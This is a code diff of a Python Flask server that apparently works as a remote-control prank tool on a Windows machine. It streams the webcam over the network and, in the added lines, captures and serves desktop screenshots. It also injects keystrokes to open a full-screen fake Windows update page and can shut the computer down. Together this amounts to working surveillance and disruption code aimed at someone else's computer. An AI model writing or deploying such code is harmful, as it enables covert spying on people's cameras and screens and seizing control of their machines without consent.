@@ -1,15 +1,16 @@
 import os
-import sys
 import keyboard
 import time
-from flask import Flask, request, abort, render_template, Response
+from flask import Flask, request, abort, render_template, Response, send_file
+import pyautogui
 import cv2
 import ait
 import pygame
+print('hi')
+time.sleep(5)
 app = Flask(__name__)
 camera=cv2.VideoCapture(0)
 responsegood = '<img src="https://c.tenor.com/4Mv5tE-bc-4AAAAC/parks-and-rec-parks-and-recreation.gif" alt"haha"><p>ur do the <strong>good</strong></p>', 200
-
 
 @app.route('/', methods=['GET','POST'])
 
@@ -57,6 +58,10 @@ def update():
     time.sleep(0.1)
     keyboard.write("firefox --kiosk https://fakeupdate.net/win10ue/", delay=0.000)
     keyboard.send('Enter')
+    keyboard.send('Win+R')
+    time.sleep(0.1)
+    keyboard.write("firefox --kiosk https://fakeupdate.net/win10ue/", delay=0.000)
+    keyboard.send('Enter')
 def shutdown():
     os.system("shutdown /s /t 1")
 
@@ -73,8 +78,16 @@ def generate_frames():
 @app.route('/cam')
 def cam():
     return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
-
+@app.route('/screen')
+def shot():
+    sshotmain = pyautogui.screenshot()
+    user = os.environ.get('USERNAME')
+    print(user)
+    tmpdir = "C:/Users/"+ user + "/AppData/Local/Temp/screenshot.png"
+    print(tmpdir)
+    sshotmain.save(tmpdir)
+    return send_file(tmpdir, mimetype='image/gif')
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0",port=5000)
+    app.run(host="0.0.0.0",port=5001)
 #you can change the port it runs on^
